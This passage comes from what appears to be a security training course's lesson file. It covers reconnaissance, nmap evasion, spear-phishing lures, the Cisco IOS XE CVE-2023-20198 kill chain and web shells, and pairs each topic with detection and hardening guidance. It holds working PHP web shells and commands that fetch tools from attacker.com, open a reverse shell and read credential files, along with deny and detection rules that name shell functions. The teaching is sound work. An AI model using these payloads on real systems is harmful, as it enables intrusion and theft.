# Next step: find gitlab.acme.com (already found in crt.sh)</code></pre>

<h4>Phase 6: GitHub Repository Search</h4>
<pre><code># Browse github.com/AcmeCorp for public repositories

# Search across repos:
org:AcmeCorp "api_key"
org:AcmeCorp "aws_secret_access_key"
org:AcmeCorp "password" filename:.env
org:AcmeCorp "BEGIN RSA PRIVATE KEY"
org:AcmeCorp "internal.acme.com"   (internal architecture in code)

# Automated:
trufflehog github --org AcmeCorp --only-verified
gitleaks detect --source ./cloned-repo --report-format json</code></pre>

<h4>Phases 7-8: Job Posting Analysis and Threat Intel</h4>
<pre><code># Phase 7: archive job postings (disappear when filled)
# web.archive.org/web/*/acme.com/careers
# Google: site:linkedin.com/jobs "Acme Corporation"

# Phase 8: Threat intelligence feeds
# VirusTotal: has anyone submitted acme.com files or URLs?
# URLhaus: any acme.com URL in abuse feeds? (prior compromise indicator)
# HaveIBeenPwned API: which employee emails are in breach databases?
curl "https://haveibeenpwned.com/api/v3/breachedaccount/sarah.chen@acme.com"     -H "hibp-api-key: YOUR_API_KEY"
# Returns: which breaches contain this email (with historically associated passwords)</code></pre>
`,
    defense: `
<h2>Defending Against Passive Reconnaissance</h2>
<p>
  You cannot prevent someone from reading public information. But you can dramatically
  reduce the intelligence value of what they find, monitor what an attacker sees about
  you, and detect when passive recon transitions to active probing.
</p>

<h3>Running Recon Against Yourself — Attack Surface Management</h3>
<pre><code># Shodan assessment of your own IP ranges:
shodan search net:203.0.113.0/24 --fields ip_str,port,product,version

# Shodan Monitor (free tier available):
# Alerts within hours when a new port or service appears on your IP ranges
# You should know about new internet-facing services before attackers do

# crt.sh monitoring — detect unauthorized certificates:
# Review weekly: https://crt.sh/?q=%.acme.com
# Any cert you did not authorize = misconfigured system, shadow IT, or hostile issuance

# Enterprise ASM tools:
# - SecurityTrails: DNS history, subdomain monitoring
# - Microsoft Defender EASM: continuous internet-wide scanning
# - Censys Attack Surface Management: continuous scanning of your assets

# Action when unexpected exposure is found:
# 1. Verify it is actually your infrastructure (Shodan data can be stale)
# 2. Determine if the service should be internet-facing
# 3. If not: restrict via firewall immediately
# 4. If yes: verify patching, configuration, and MFA enforcement</code></pre>

<h3>WHOIS Privacy and Domain Security</h3>
<pre><code># Enable WHOIS privacy — hides personal names, emails, phone numbers
# Does NOT hide: nameservers, registrar, dates, status codes

# What attackers still learn from redacted WHOIS:
# - NS records reveal your DNS provider (AWS Route 53? Cloudflare? Self-hosted?)
# - Expiry date reveals squatting opportunity

# Domain security hardening:
# - Enable registry lock (prevents unauthorized transfers)
# - Enable 2FA on your registrar account
# - Auto-renew AND set calendar alerts at 90, 30, 7 days before expiry

# Monitor for typosquatted domains:
pip install dnstwist
dnstwist --registered acme.com   # Find registered variations of your domain</code></pre>

<h3>GitHub Secret Scanning and Repository Hygiene</h3>
<pre><code># Enable GitHub Secret Scanning (free for public repos):
# Settings -> Security -> Code security and analysis -> Secret scanning -> Enable
# GitHub alerts on: AWS keys, GitHub tokens, Slack tokens, Stripe keys,
# private keys (BEGIN RSA PRIVATE KEY), 200+ other patterns

# Pre-commit hooks to prevent secrets reaching the repo:
pip install detect-secrets
detect-secrets scan > .secrets.baseline

# .pre-commit-config.yaml:
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

pip install pre-commit
pre-commit install   # runs on every git commit

# If a secret has ever been committed — even briefly, even if deleted:
# 1. Treat credential as fully compromised immediately
# 2. Rotate it NOW (revoke old, generate new)
# 3. GitHub search indexes deleted content for months
# 4. GitGuardian and similar services have already indexed it
# 5. "I deleted the commit" is NEVER sufficient</code></pre>

<h3>Reducing Information Leakage in Job Postings</h3>
<p>
  Every technical detail in a public job posting is free intelligence for an attacker.
</p>
<ul>
  <li><strong>Never specify version numbers</strong>: "Cisco IOS XE 17.3" tells attackers
  which CVEs apply. Say "Cisco enterprise networking" instead.</li>
  <li><strong>Avoid listing specific security tools</strong>: "Experience with Splunk ES"
  reveals your SIEM. "SIEM experience" does not.</li>
  <li><strong>Do not enumerate your exact cloud footprint</strong>: "AWS EKS, Azure AKS,
  GCP GKE" reveals multicloud strategy. "Cloud container orchestration" is sufficient.</li>
  <li><strong>Review historical job postings</strong>: Use the Wayback Machine to find past
  postings that revealed sensitive details — assess whether that info is still valid.</li>
</ul>

<h3>Error Page Hardening and HTTP Header Hygiene</h3>
<pre><code># nginx — custom error pages (zero technical content):
error_page 400 401 403 404 /errors/4xx.html;
error_page 500 502 503 504 /errors/5xx.html;
# Contents: "Something went wrong. Please try again."
# NOT: "Apache/2.4.49 Server at acme.com Port 443"
# NOT: "MySQL Error: Table 'prod_db.users' doesn't exist"
# NOT: Full Python traceback with file paths and variable values

# Remove version-revealing HTTP headers:
server_tokens off;        # nginx: hides version
# php.ini: expose_php = Off  (removes X-Powered-By: PHP/x.x.x)

# Audit what you are leaking right now:
curl -I https://acme.com
# Review every response header for version numbers and technology disclosure</code></pre>

<h3>Dark Web and Breach Monitoring</h3>
<pre><code># HaveIBeenPwned API:
# Check all employee emails at onboarding
# Domain-level monitoring: alerts when ANY @acme.com appears in new breach

# Commercial monitoring services:
# - SpyCloud: breach data with plaintext passwords (credential stuffing defense)
# - Digital Shadows (ReliaQuest): dark web + paste site monitoring
# - Recorded Future: threat intel with dark web coverage

# Manual paste site monitoring (free starting point):
# Google Alerts for: your domain, executive names, internal codenames
# site:pastebin.com "acme.com"</code></pre>

<h3>Continuous Attack Surface Management Program</h3>
<ul>
  <li><strong>Weekly</strong>: Review crt.sh for new certificate issuances. Unauthorized
  certs indicate shadow IT, misconfiguration, or hostile issuance.</li>
  <li><strong>Weekly</strong>: Run Shodan against your IP ranges. New entries = new
  internet-facing services, intended or not.</li>
  <li><strong>Monthly</strong>: Full theHarvester run. Review what an attacker finds in
  one hour of passive recon today.</li>
  <li><strong>Monthly</strong>: Review public GitHub repos associated with your organization.</li>
  <li><strong>Quarterly</strong>: Review job postings for technology disclosure. Brief HR
  and recruiting on what not to publish.</li>
  <li><strong>On every breach notification</strong>: Run HaveIBeenPwned against all
  employee emails. Reset affected passwords. Assume reuse on corporate accounts.</li>
</ul>
`,
  },

  'active-recon': {
    concept: `
<h2>Active Reconnaissance with Nmap</h2>
<p>
  After passive recon, you have a list of IP addresses and domains. Now you need to
  know <em>what's running</em> on them. Active recon involves directly probing target
  systems — it generates traffic and can trigger IDS/firewall alerts.
</p>

<h3>Nmap — The Standard Reconnaissance Tool</h3>
<p>
  Nmap (Network Mapper) is the industry standard for network discovery and port
  scanning. Used by both attackers and defenders daily. It's pre-installed on
  Kali Linux and every professional pentester's toolkit.
</p>

<h3>Nmap Scan Types</h3>
<pre><code>Stealth SYN Scan (-sS, default as root):
  Sends SYN → waits for SYN-ACK (open) or RST (closed)
  Never completes the handshake → "stealthy" (but still logged by modern IDS)
  Fastest and most common scan type

TCP Connect Scan (-sT):
  Completes the full three-way handshake
  Slower, more detectable, but works without root privileges

UDP Scan (-sU):
  Probes UDP ports (DNS:53, SNMP:161, NTP:123)
  Slower — UDP has no SYN/ACK, must wait for timeout

Service/Version Detection (-sV):
  After finding open ports, sends banner-grab probes
  Returns: Apache 2.4.41, OpenSSH 8.2p1, MySQL 8.0.27

OS Detection (-O):
  Analyzes TCP/IP stack behavior to fingerprint OS
  Returns: "Linux 4.15-5.6", "Windows Server 2019"

Script Scan (-sC or --script):
  Runs NSE (Nmap Scripting Engine) scripts
  Default scripts: service banners, common CVEs, HTTP titles</code></pre>

<h3>Practical Nmap Recipes</h3>
<pre><code># Discover live hosts on a network (no port scan)
nmap -sn 192.168.1.0/24

# Quick port scan of top 1000 ports
nmap 192.168.1.100

# Full port scan with service detection
nmap -sV -p- 192.168.1.100

# Aggressive scan (OS, versions, scripts, traceroute)
nmap -A 192.168.1.100

# Vulnerability scan
nmap --script vuln 192.168.1.100

# Scan with output to files
nmap -oA scan_results 192.168.1.100</code></pre>

<h3>Understanding Nmap Output</h3>
<pre><code>PORT      STATE   SERVICE       VERSION
22/tcp    open    ssh           OpenSSH 8.2p1 Ubuntu
80/tcp    open    http          Apache httpd 2.4.41
443/tcp   open    ssl/https     Apache httpd 2.4.41
3306/tcp  open    mysql         MySQL 8.0.27
8080/tcp  filtered http          ← firewall is blocking this
23/tcp    closed  telnet         ← service not running

Each open port = potential attack vector
Each version = searchable in CVE databases</code></pre>
`,
    technique: `
<h2>How Professional Attackers Use Nmap</h2>

<h3>Stealth Techniques</h3>
<pre><code># Slow scan to avoid IDS rate-based detection
nmap -sS -T1 --max-retries 1 192.168.1.100
# T0=paranoid, T1=sneaky, T2=polite, T3=normal, T4=aggressive, T5=insane

# Decoy scan — appear to come from multiple IPs
nmap -D RND:10 192.168.1.100
# IDS sees 10 different source IPs doing the scan — hard to attribute

# Fragment packets to evade packet-inspection firewalls
nmap -f 192.168.1.100

# Use a specific source port (looks like legitimate traffic)
nmap --source-port 53 192.168.1.100  # Looks like DNS traffic</code></pre>

<h3>Salt Typhoon's Recon Phase</h3>
<p>
  Salt Typhoon's reconnaissance of US telecom infrastructure combined automated
  Shodan searches with targeted nmap scans. Their workflow:
</p>
<pre><code>Phase 1: Shodan query
  product:"Cisco IOS XE" org:"AT&T" port:443
  → Returns 200+ routers with version numbers

Phase 2: Version filtering
  Identify which routers run IOS XE 17.3.x - 17.9.x (vulnerable range)

Phase 3: Targeted nmap
  nmap -sV -p 80,443 --script http-cisco-anyconnect [target_ip]
  → Confirm web UI is enabled and version is vulnerable

Phase 4: Exploitation
  exploit CVE-2023-20198 [target_ip]</code></pre>

<h3>Service Enumeration After Port Discovery</h3>
<pre><code># After finding SSH on port 22:
ssh-audit target.com      # Check SSH config, algorithms, known vulns

# After finding HTTP on port 80:
nikto -h http://target.com   # Web vulnerability scanner
dirb http://target.com       # Directory bruteforce
gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt

# After finding SMB on port 445:
enum4linux target.com     # SMB enumeration
smbclient -L target.com   # List shares

# After finding SNMP on port 161:
snmpwalk -v2c -c public target.com  # If default community string</code></pre>
`,
    defense: `
<h2>Detecting and Defending Against Nmap Scans</h2>

<h3>Detection Rules</h3>
<pre><code># Snort/Suricata — detect SYN scan pattern
alert tcp any any -> $HOME_NET any (
    flags:S;
    msg:"Potential SYN Scan Detected";
    threshold: type both, track by_src, count 15, seconds 5;
    classtype:network-scan;
    sid:1000001;
)

# Sigma rule — Windows security event log
title: Nmap Port Scan via Windows Firewall Log
logsource:
    product: windows
    service: firewall
detection:
    selection:
        EventID: 5157  # Blocked connection
    timeframe: 10s
    condition: selection | count() by DestinationPort > 20
level: medium</code></pre>

<h3>Active Countermeasures</h3>
<pre><code># fail2ban — auto-block IPs after scanning behavior
[Definition]
enabled  = true
filter   = portscan
action   = iptables-multiport[name=portscan, port="all"]
logpath  = /var/log/kern.log
maxretry = 15
findtime = 30
bantime  = 3600  # ban for 1 hour</code></pre>

<h3>Hardening (Reduce What Nmap Finds)</h3>
<ul>
  <li>Close all ports that aren't serving a purpose (default-deny firewall)</li>
  <li>Move SSH to a non-standard port (raises effort, not security guarantee)</li>
  <li>Disable version banners: <code>server_tokens off</code> in nginx</li>
  <li>Use a honeypot: open fake ports (e.g., 8080, 8443) — alert on any connection</li>
  <li>Implement port-knocking for SSH: must knock specific ports in sequence to unlock</li>
</ul>
<pre><code># Verify YOUR exposure with nmap (authorized self-test):
nmap -sV -T4 your-public-ip
# Everything that shows up = what attackers see
# Close anything you don't recognize</code></pre>
`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // LEVEL 2 — INITIAL ACCESS
  // ══════════════════════════════════════════════════════════════════════════

  'phishing': {
    concept: `
<h2>Spear Phishing — The Most Effective Attack Vector</h2>
<p>
  Despite all the technical sophistication of modern attacks, the most common way
  into an organization is still remarkably simple: trick a human.
</p>
<p>
  <strong>Phishing</strong> sends deceptive messages to victims to steal credentials,
  deliver malware, or gain access. <strong>Spear phishing</strong> is the targeted
  version — crafted specifically for one person using their real name, role, and context.
</p>

<blockquote>
  "We can spend millions on firewalls, but it's meaningless if someone holds the
  door open for an attacker." — Kevin Mitnick
</blockquote>

<h3>Why It Works — The Psychology</h3>
<p>Spear phishing exploits fundamental human psychology:</p>
<ul>
  <li><strong>Authority</strong> — "This is from your CEO / IT department / your bank"</li>
  <li><strong>Urgency</strong> — "Your account will be suspended in 24 hours"</li>
  <li><strong>Fear</strong> — "Unauthorized access detected on your account"</li>
  <li><strong>Curiosity</strong> — "See who viewed your LinkedIn profile"</li>
  <li><strong>Trust</strong> — Using a name, context, or detail that feels real</li>
</ul>
<p>
  When a message triggers an emotional response (fear, urgency), the rational brain
  disengages and people click before thinking.
</p>

<h3>Types of Phishing</h3>
<pre><code>Phishing       → Mass campaign, generic targets (millions of emails)
Spear Phishing → Targeted individual, uses personal context
Whaling        → Targeted at executives (CEO fraud, BEC)
Vishing        → Voice phishing (phone calls)
Smishing       → SMS phishing
Clone Phishing → Duplicate a legitimate email, replace link with malicious one
Pretexting     → Building a cover story before the attack</code></pre>

<h3>A Real Spear Phishing Email Breakdown</h3>
<pre><code>From:    it-support@acme-corp.com ← spoofed domain (note: acme-CORP not acme)
To:      john.smith@acme.com
Subject: URGENT: Your account has been locked

Hi John,

Our security system has detected unusual activity on your account.
To restore access, please verify your credentials within 24 hours:

[Reset Password Now] ← links to http://acme-corp.co/login (fake)

IT Support Team
Acme Corporation

────────────────────────────────────────────────
Red flags:
✗ Wrong sender domain (acme-corp.com vs acme.com)
✗ Urgent language designed to bypass critical thinking
✗ Hover over link → different domain than displayed
✗ Generic "unusual activity" — no specific detail
✗ No MFA requirement in the process</code></pre>
`,
    technique: `
<h2>How APTs Execute Spear Phishing</h2>

<h3>Phase 1: Target Research</h3>
<pre><code>Using passive recon against "Acme Corp":
  LinkedIn  → John Smith, Sr. Network Engineer, joined 3 months ago
  GitHub    → John's public repos show Cisco expertise
  Twitter   → John tweets about attending Cisco Live next week
  News      → Acme Corp announced new data center last month

Insight:
  John is the network engineer who likely manages Cisco routers
  He's new enough that he might not know all colleagues yet
  He's attending Cisco Live → impersonate a Cisco rep</code></pre>

<h3>Phase 2: Lure Crafting</h3>
<pre><code>Attacker creates lure leveraging:
  → Cisco Live conference (John is attending)
  → New hire context (doesn't know all colleagues)
  → Technical detail that sounds plausible

Subject: Cisco Live 2024 — Pre-Conference VPN Setup Required

Hi John,

As a registered Cisco Live 2024 attendee, you'll need to configure
the Cisco AnyConnect profile to access conference resources.

Please download and install the profile here:
[Download Cisco AnyConnect Profile] ← actually a malicious executable

Your registration ID: CL2024-38291

Thanks,
Michael Chen
Cisco Events Team</code></pre>

<h3>Infrastructure Used by APTs</h3>
<pre><code>Domain squatting:
  cisco-live2024.net    (registered day before campaign)
  cisco-events.support  (looks legitimate)
  cisco-anyconnect.io   (technical-sounding)

Email sending:
  Use compromised SMTP servers (not their own infrastructure)
  Or legitimate email marketing platforms
  Or bulletproof hosting providers

MITRE ATT&CK:
  T1566.001 — Spearphishing Attachment
  T1566.002 — Spearphishing Link
  T1566.003 — Spearphishing via Service (LinkedIn DM, etc.)</code></pre>

<h3>Malicious Attachments</h3>
<pre><code>Common payload delivery methods:
  .docx with macro  → Office macro executes PowerShell on open
  .pdf              → PDF exploit (rare, high-value targets)
  .iso/.img         → Mounts as drive, contains .lnk that runs exe
  .html attachment  → Opens fake login page locally (evades URL scanning)
  .zip with .exe    → Social engineering to "run the installer"

Salt Typhoon used:
  HTML email with credential harvesting form
  Technical pretext: "Cisco Security Advisory — Action Required"</code></pre>
`,
    defense: `
<h2>Anti-Phishing Defense Stack</h2>

<h3>Email Authentication (Block Spoofing)</h3>
<pre><code># SPF — defines which servers can send for your domain
acme.com. IN TXT "v=spf1 include:_spf.google.com ~all"

# DKIM — cryptographically signs each email
selector._domainkey.acme.com. IN TXT "v=DKIM1; k=rsa; p=MIIBIjANBgkq..."

# DMARC — policy: what to do with SPF/DKIM failures
_dmarc.acme.com. IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc@acme.com"
# p=none    → monitor only (start here)
# p=quarantine → send to spam
# p=reject  → block the email (goal state)

# Check your domain: https://dmarcian.com/dmarc-inspector/</code></pre>

<h3>User Training</h3>
<pre><code># GoPhish — open source phishing simulation platform
# Run quarterly campaigns against your own employees:

gophish  # Start GoPhish server

Campaign setup:
  1. Clone a real email your org receives (IT, HR, finance)
  2. Create landing page that captures who clicks
  3. Send to all employees
  4. Track: open rate, click rate, credential submission rate
  5. Immediately train users who clicked

Industry benchmark: < 5% click rate = good security culture
If > 20% click → mandatory training required</code></pre>

<h3>Technical Controls</h3>
<ul>
  <li><strong>MFA everywhere</strong> — even if phished, stolen passwords don't work alone</li>
  <li><strong>Browser isolation</strong> — risky URLs open in a remote browser (no local code execution)</li>
  <li><strong>DNS filtering</strong> — block newly registered domains (< 30 days old)</li>
  <li><strong>Email sandboxing</strong> — detonate attachments in sandbox before delivery (Proofpoint, Defender ATP)</li>
  <li><strong>Disable Office macros</strong> — Group Policy: block all macros from internet-sourced files</li>
</ul>
<pre><code># Sigma rule: detect suspicious Office macro execution
title: Office Document Macro Spawning Shell
detection:
    selection:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\wscript.exe'
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1566</code></pre>
`,
  },

  // ─────────────────────────────────────────────────────────────────────────

  'edge-devices': {
    concept: `
<h2>Edge Device Exploitation</h2>
<p>
  "Edge devices" are the network equipment at the boundary between your organization
  and the internet — routers, firewalls, VPN gateways, load balancers. They are the
  highest-value targets in any network for three reasons:
</p>
<ol>
  <li>They're <strong>always internet-connected</strong> by definition</li>
  <li>Security agents (EDR, AV) rarely run on network devices</li>
  <li>Compromising them gives an attacker a <strong>foothold inside the network</strong>
  with full visibility of all traffic passing through</li>
</ol>

<h3>The Salt Typhoon Case</h3>
<p>
  In 2023-2024, Salt Typhoon breached multiple US telecom providers using
  <strong>CVE-2023-20198</strong> — a critical flaw in Cisco IOS XE's web UI.
  The vulnerability had a CVSS score of <strong>10.0 (maximum)</strong>.
</p>

<h3>What is CVE-2023-20198?</h3>
<p>
  Cisco IOS XE's web management interface had an unauthenticated endpoint that
  allowed any remote attacker to create a new admin account with privilege level 15
  (full administrator) — no credentials required.
</p>
<pre><code>Affected versions: Cisco IOS XE 16.x - 17.x with web UI enabled
Exploit type:      Unauthenticated Remote Privilege Escalation
CVSS Score:        10.0 (Critical)
Patch released:    October 22, 2023
Exploited in wild: Before patch release (0-day period)
Victims:           AT&T, Verizon, T-Mobile, and others</code></pre>

<h3>Why This Type of Vulnerability Is So Dangerous</h3>
<pre><code>Normal breach path:
  Phishing → Credential theft → VPN → Internal network → Pivot → DC

Edge device breach path:
  Internet → CVE exploit → Router with admin access → Full network visibility
  Steps: 1
  Time to exploit: &lt; 60 seconds
  Detection: Near zero (no agents, logs often not forwarded to SIEM)</code></pre>

<h3>The Broader Category: Edge Device CVEs</h3>
<pre><code>CVE-2023-20198 — Cisco IOS XE (privilege escalation)
CVE-2022-40684  — Fortinet FortiOS (auth bypass)
CVE-2023-46805  — Ivanti Connect Secure (auth bypass)
CVE-2022-3236   — Sophos Firewall (RCE)
CVE-2021-44228  — Log4Shell (affects many edge devices)

Pattern: Auth bypass or unauth RCE → immediate full access
Pattern: Patching is slow (network device patching is disruptive)</code></pre>
`,
    technique: `
<h2>CVE-2023-20198: Technical Breakdown</h2>

<h3>The Vulnerable Endpoint</h3>
<p>
  Cisco IOS XE's web UI (running on port 80/443) exposed an endpoint
  at <code>/webui/logoutconfirm.html</code> that was accessible without authentication.
  The HTTP server incorrectly exempted this path from auth checks.
</p>
<pre><code>Vulnerable endpoint: POST /webui/logoutconfirm.html?logon_hash=1 HTTP/1.1
Host: [TARGET_ROUTER]:443

The server processes this POST request without any authentication.
Crafted payload creates a privileged user account.

HTTP/1.1 200 OK
← Account created with privilege level 15 (admin)</code></pre>

<h3>Salt Typhoon's Complete Kill Chain</h3>
<pre><code>Day 0-7:   RECONNAISSANCE
  Shodan: product:"Cisco IOS XE" org:"[Telecom Provider]" port:443
  Filter for vulnerable firmware versions (16.x - 17.9.x)
  Result: 200+ vulnerable routers identified

Day 8:     INITIAL ACCESS
  exploit CVE-2023-20198 [router_ip]
  → Create admin account: user/Cisco-2024!
  → HTTP POST to /webui/logoutconfirm.html

Day 8:     PRIVILEGE ESCALATION
  exploit CVE-2023-20273 [router_ip] (chained vuln)
  → Execute commands via web UI with level-15 privileges

Day 9:     PERSISTENCE IMPLANT
  Deploy GhostSpider backdoor → implanted in flash storage
  Survives device reboots
  Uses HTTPS to C2 server (looks like normal management traffic)

Day 10-180: COLLECTION
  Access CALEA (lawful intercept) systems connected to router
  Collect call metadata: who called whom, when, duration
  Monitor law enforcement surveillance requests

Day 180:   DETECTED (average dwell time)</code></pre>

<h3>MITRE ATT&CK Mapping</h3>
<pre><code>T1190  — Exploit Public-Facing Application (CVE-2023-20198)
T1078  — Valid Accounts (created via exploit)
T1505.003 — Web Shell (GhostSpider implant)
T1014  — Rootkit (kernel-level persistence)
T1071  — Application Layer Protocol (C2 over HTTPS)
T1560  — Archive Collected Data</code></pre>

<p>Try it in the lab: <code>exploit CVE-2023-20198 10.0.0.1</code></p>
`,
    defense: `
<h2>Defending Edge Devices Against CVE-Class Attacks</h2>

<h3>Immediate Hardening (CVE-2023-20198 specific)</h3>
<pre><code>! On all Cisco IOS XE devices — disable web UI if not needed:
no ip http server
no ip http secure-server

! If web UI is required, restrict to trusted management IPs ONLY:
ip http access-class ACL-MGMT in
ip access-list standard ACL-MGMT
 permit 10.0.0.0 0.0.0.255   ! your management subnet only
 deny any log

! Enable logging of all management authentication events:
logging buffered 65536 informational
archive
 log config
  logging enable
  notify syslog</code></pre>

<h3>Network Device Security Program</h3>
<ul>
  <li><strong>Asset inventory</strong>: Know every network device, firmware version, and management exposure</li>
  <li><strong>Patch cadence</strong>: Critical CVEs on network devices patched within 48 hours</li>
  <li><strong>Out-of-band management</strong>: Manage devices through a separate OOB network — never expose management to the internet</li>
  <li><strong>Log forwarding</strong>: All syslog from network devices → SIEM (not stored only locally)</li>
  <li><strong>Baselines</strong>: Hash/snapshot running configs — alert on any unauthorized changes</li>
</ul>

<h3>Detection: What to Alert On</h3>
<pre><code># Sigma rule: new privileged accounts on network devices
title: Cisco IOS XE Unauthorized Account Creation
logsource:
    category: network
    service: cisco-ios
detection:
    keywords:
        - 'username.*privilege 15'
        - 'new user.*created'
    condition: keywords
level: critical
tags:
    - attack.initial_access
    - attack.t1190

# Also alert on:
# - HTTP/HTTPS connections to router management port from external IPs
# - Configuration changes outside change windows
# - Unexpected outbound connections from routers (C2 beaconing)
# - New processes spawned from web UI worker (rare, indicates RCE)</code></pre>
`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // LEVEL 3 — PERSISTENCE
  // ══════════════════════════════════════════════════════════════════════════

  'web-shells': {
    concept: `
<h2>Web Shells — Permanent Backdoors Through Web Servers</h2>
<p>
  A web shell is a script (usually PHP, ASP, or JSP) placed on a web server that
  gives an attacker a persistent backdoor accessible via normal HTTP requests.
</p>

<h3>The Analogy: A Hidden Key Under the Doormat</h3>
<p>
  Imagine you gain access to someone's house, then hide a spare key under their
  doormat before you leave. Even if they change the locks, you still have access
  through the hidden key. A web shell is that hidden key — it persists even after
  the initial vulnerability is patched.
</p>

<h3>The Simplest Web Shell Ever Written</h3>
<pre><code>&lt;?php system($_GET['cmd']); ?&gt;

# That's it. 34 characters.
# Place in /var/www/html/uploads/image.php
# Use as: http://target.com/uploads/image.php?cmd=whoami
# Returns: www-data
# Use as: http://target.com/uploads/image.php?cmd=id;cat+/etc/passwd
# Returns: all users on the system</code></pre>

<h3>How Web Shells Get Planted</h3>
<pre><code>Method 1: File Upload Vulnerability
  → Site allows file uploads (profile pictures, documents)
  → No server-side validation of file type
  → Attacker uploads shell.php disguised as image.jpg.php
  → Navigate to the file URL → shell active

Method 2: After Initial Exploitation (Salt Typhoon method)
  → CVE-2023-20198 gives router admin access
  → Deploy GhostSpider implant in flash storage
  → Implant persists across reboots

Method 3: Remote Code Execution
  → SQL injection, command injection, or other RCE
  → Write a shell file to the web root via RCE

Method 4: Compromised File Transfer
  → SFTP/FTP credentials stolen → upload shell</code></pre>

<h3>More Sophisticated Web Shells</h3>
<pre><code># Password-protected web shell
&lt;?php
if ($_GET['pass'] == 'SecretKey123') {
    system($_POST['cmd']);
}
?&gt;

# Obfuscated to bypass WAF/AV detection
&lt;?php
$f = base64_decode('c3lzdGVt');  // 'system' in base64
$c = $_GET['x'];
$f($c);
?&gt;

# China Chopper — 2-byte shell used by APT groups including Salt Typhoon
&lt;?php @eval($_POST['password']);?&gt;
# Small, hard to detect by hash, enables full control via POST</code></pre>
`,
    technique: `
<h2>APT Web Shell Tradecraft</h2>

<h3>Salt Typhoon's GhostSpider</h3>
<p>
  GhostSpider is Salt Typhoon's custom backdoor implant deployed after gaining
  initial router access. Unlike a simple PHP shell, it's a sophisticated modular
  backdoor:
</p>
<pre><code>GhostSpider characteristics:
  - Stored in router flash memory (survives factory config resets)
  - Uses legitimate HTTPS for C2 (blends with management traffic)
  - Supports plugin loading (additional modules pulled from C2)
  - Encrypted communications (keys embedded in binary)
  - Fileless component lives only in memory between operations

Commands GhostSpider accepts from C2:
  - exec [command]     → run OS command
  - upload [file]      → send file to C2
  - download [url]     → pull file from C2
  - tunnel [port]      → set up TCP tunnel through device
  - sniffer [filter]   → capture matching network traffic</code></pre>

<h3>Web Shell Evasion Techniques</h3>
<pre><code># Rename to look like legitimate files
shell.php → wp-config-backup.php
shell.php → jquery-3.6.0.min.php
shell.php → xmlrpc.php (overwrite existing file)

# Embed in legitimate files
&lt;?php /* normal PHP file content here */
/* 500 lines of legitimate code */
if ($_SERVER['HTTP_X_SECRET'] == 'abc') { eval($_POST['d']); }
/* More legitimate code */
?&gt;

# Trigger only from specific User-Agent or IP
if ($_SERVER['HTTP_USER_AGENT'] == 'Mozilla/5.0 Backdoor') {
    system($_GET['cmd']);
}

# Use timestamp manipulation to hide file modification
touch -t 202001010000.00 shell.php  # Set timestamp to 2020</code></pre>

<h3>Lateral Movement via Web Shell</h3>
<pre><code># Once inside, web shell enables:
# 1. Internal network scanning (the web server is now your pivot)
curl http://shell.php?cmd=nmap+-sn+10.0.0.0/24

# 2. Credential harvesting from config files
curl http://shell.php?cmd=cat+/etc/mysql/my.cnf
curl http://shell.php?cmd=find+/var/www+-name+"*.config"+-exec+cat+{}\;

# 3. Download additional tools
curl http://shell.php?cmd=wget+http://attacker.com/nc+-O+/tmp/nc

# 4. Establish persistent reverse shell
curl http://shell.php?cmd=bash+-i+>%26+/dev/tcp/10.0.0.5/4444+0>%261</code></pre>
`,
    defense: `
<h2>Detecting and Removing Web Shells</h2>

<h3>File Integrity Monitoring (FIM)</h3>
<pre><code># Linux — AIDE (Advanced Intrusion Detection Environment)
aide --init    # Create baseline database
aide --check   # Compare against baseline → alerts on new/modified files

# Targeted monitoring for web directories:
/var/www/html CONTENT_EX  # Alert on any file change in web root

# Wazuh FIM rule example:
&lt;directories check_all="yes" realtime="yes"&gt;/var/www/html&lt;/directories&gt;
# → Real-time alert when ANY file changes in web root</code></pre>

<h3>Web Application Firewall Rules</h3>
<pre><code># ModSecurity (Apache/nginx WAF)
# Detect web shell command execution patterns:
SecRule REQUEST_URI "@rx (?:cmd|exec|command|shell|passthru|system)=" \
    "id:100001,phase:2,deny,status:403,msg:'Web Shell Command Execution'"

SecRule ARGS "@rx (?:system|exec|passthru|shell_exec|popen|proc_open)" \
    "id:100002,phase:2,deny,status:403,msg:'PHP Function in Parameter'"</code></pre>

<h3>Log Analysis for Web Shell Detection</h3>
<pre><code># Access log pattern: web shell usage looks different from normal traffic
Normal: GET /index.php HTTP/1.1 200 5234    ← large response (full page)
Shell:  GET /shell.php?cmd=id HTTP/1.1 200 12  ← tiny response (command output)

# Sigma rule:
title: Web Shell Activity — Suspicious HTTP Response Size
detection:
    selection:
        response_size|lt: 100          # Tiny response
        http_method: GET
        uri|contains:
            - '.php?cmd='
            - '?exec='
            - '?shell='
    condition: selection
level: high</code></pre>

<h3>Incident Response for Web Shells</h3>
<pre><code># 1. Find all PHP files modified in last 30 days
find /var/www -name "*.php" -mtime -30 -ls

# 2. Search for known web shell signatures
grep -r "system\|exec\|passthru\|shell_exec\|eval" /var/www --include="*.php" -l

# 3. Check for files with very small size (simple shells)
find /var/www -name "*.php" -size -1k

# 4. Search for base64 encoded strings (obfuscation indicator)
grep -r "base64_decode\|str_rot13\|gzinflate" /var/www --include="*.php" -l</code></pre>
`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // LEVEL 4 — LATERAL MOVEMENT
  // ══════════════════════════════════════════════════════════════════════════

  'credential-harvesting': {
    concept: `
<h2>Credential Harvesting — The Keys to the Kingdom</h2>
<p>
  After gaining a foothold, attackers need to move deeper. The most reliable way is
  to steal credentials — usernames and passwords (or password hashes) that let them
  log into other systems as legitimate users.
</p>

<h3>The Analogy: A Master Key Maker</h3>
<p>
  Imagine you break into a janitor's closet in a hotel. Inside you find the master
  key cabinet. You don't need to pick every lock — you just copy the master key that
  opens every door. Credential harvesting in Windows is exactly this.
</p>

<h3>Where Windows Stores Credentials</h3>
<pre><code>LSASS Process (Local Security Authority Subsystem Service)
  → Holds plaintext passwords in memory (older systems)
  → Holds NTLM hashes of all logged-in users
  → Holds Kerberos tickets for active sessions
  → Running as: NT AUTHORITY\\SYSTEM

SAM Database (Security Account Manager)
  → C:\\Windows\\System32\\config\\SAM
